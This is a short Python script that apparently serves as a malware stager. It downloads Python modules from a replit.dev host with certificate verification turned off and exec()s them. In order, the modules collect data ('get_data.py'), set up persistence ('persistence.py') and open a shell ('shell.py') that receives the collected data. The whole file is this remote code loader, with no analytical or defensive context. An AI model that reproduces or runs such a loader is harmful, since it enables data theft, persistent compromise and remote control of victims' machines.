from urllib.request import urlopen
import importlib.util
import os
import subprocess
import ssl
import sys

#check to see if the scirpt is already Rolling


# download python code
def create_moduel(url):
  # Create an SSL context that doesn't verify certificates
  context = ssl._create_unverified_context()
  # Use the context when opening the URL
  with urlopen(url, context=context) as response:
    code = response.read().decode('utf-8')

  spec = importlib.util.spec_from_loader('temp', loader=None)
  module = importlib.util.module_from_spec(spec)

  # Execute the code in the module's namespace
  exec(code, module.__dict__)

  # execute the code in the temporary module
  exec(code, module.__dict__)

  return module

module = create_moduel("https://1e26c3bd-d2fc-4199-8c95-28e5c4f20ff4-00-3mijlg2wczefz.riker.replit.dev/get_data.py")

data = module.run() # works fine the shell part gives errors

module = create_moduel("https://1e26c3bd-d2fc-4199-8c95-28e5c4f20ff4-00-3mijlg2wczefz.riker.replit.dev/persistence.py")
module.run()

module = create_moduel("https://1e26c3bd-d2fc-4199-8c95-28e5c4f20ff4-00-3mijlg2wczefz.riker.replit.dev/shell.py")

module.run(data)  